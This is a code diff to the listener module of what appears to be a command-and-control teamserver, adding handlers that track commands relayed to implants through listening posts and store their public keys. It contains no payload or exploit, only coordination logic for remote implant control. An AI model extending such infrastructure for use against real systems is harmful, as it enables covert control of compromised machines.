@@ -6,7 +6,14 @@ from lib import instructions
 from lib.crypto import asymmetric
 
 
-# TODO: All frame cooking and uncooking should be done here for
+def _get_cmd_sent_index(teamserver, cmd_txid):
+    try:
+        cmd_sent_index = next(index for (index, command) in enumerate(teamserver.cmd_sent) if command['txid'] == cmd_txid)
+        return cmd_sent_index
+    except StopIteration:
+        teamserver.logging.log(f"Command {cmd_txid} not found!",
+                               level="error", source="lib.listener")
+    pass
 
 
 def lp_init(frame, teamserver):
@@ -51,8 +58,9 @@ def lp_initialized(frame, teamserver):
 def lp_process_manifest(frame, teamserver):
     # TODO: Extract and process the manifest
     # TODO: Implement me
+    # TODO: Make sure lp isn't already configured, update it if it is
     listening_post_manifest = next(item for item in frame['args'] if item["component_id"] == frame['component_id'])
-    listening_post_manifest['lpk'] = asymmetric.public_key_from_bytes(str(frame['args'][1]['lpk']))
+    listening_post_manifest['lpk'] = frame['args'][1]['lpk']
     # TODO: Check if implants are already in manifest
     # TODO: Check if lp even has implants, handle that case
     for implant in listening_post_manifest['implants']:
@@ -125,6 +133,20 @@ def lp_getcmd(frame, teamserver):
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = instruction_frame
     return reply_frame
+
+
+def lp_cmdack(frame, teamserver):
+    """
+    Receipt of an ack for commands from lp. Used to updated command state internally.
+    """
+    for cmd_txid in frame['args'][0]['cmd_txids']:
+        cmd_sent_index = _get_cmd_sent_index(teamserver, cmd_txid)
+        teamserver.cmd_sent[cmd_sent_index]['state'] = "RELAYING"
+
+    # Crypto related
+    lp_index = find_component_index_by_id("listener", frame['component_id'], teamserver)
+    teamserver.listeners[lp_index]['lpk'] = frame['args'][1]['lpk']
+    return None
 
 
 def find_lp_pubkey(search_key, teamserver):
